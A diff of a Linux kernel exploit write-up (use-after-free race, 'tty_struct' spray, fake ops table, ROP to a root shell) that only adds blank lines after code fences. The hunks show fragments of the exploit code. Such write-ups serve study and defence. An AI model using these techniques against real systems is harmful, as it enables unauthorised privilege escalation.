@@ -152,6 +152,7 @@ The vulnerability is a UAF which is caused by a race condition on releasing the 
 ## Triggering the race
 Lets look on the following code:
 ```C
+
 bool stop_running = false;
 
 void *race_thread() {
@@ -209,6 +210,7 @@ As we can see, in 2 cases of the loop, we printed 0x5401 which corresponds to a 
 
 `tty_struct` definition for kernel 5.16.14 can be found [here](https://elixir.bootlin.com/linux/v5.16.14/source/include/linux/tty.h#L143)
 ```C
+
 struct tty_struct {
 	int	magic;
 	struct kref kref;
@@ -296,6 +298,7 @@ We note the following:
 ## Getting code execution
 As we can see the `tty_struct` has a `ops` pointer, which point to the following struct:
 ```C
+
 struct tty_operations {
 	struct tty_struct * (*lookup)(struct tty_driver *driver,
 			struct file *filp, int idx);
@@ -374,6 +377,7 @@ To use the gadget, I crafted a fake `ops` table (containing 14 functions - all t
 
 I trigger the write callback by calling `write` to all the opened `tty_struct` file descriptors from the spraying phase:
 ```C
+
     for (int i = 0; i < 0x100; ++i) {
         write(ptmx[i], dummy_buff, sizeof(dummy_buff));
     }
@@ -412,6 +416,7 @@ This part is pretty standard:
 
 * At the beginning of main, I've set the context I want to return to in the function `setup_iretq_context`:
 ```C
+
 unsigned long cs;
 unsigned long ss;
 unsigned long rip = (unsigned long) &execve_bin_bash;
@@ -449,6 +454,7 @@ The Rop looks something like this:
 ## Putting it all together
 Here's the final code:
 ```C
+
 #include <stdio.h>
 #include <fcntl.h>
 #include <cstdlib>
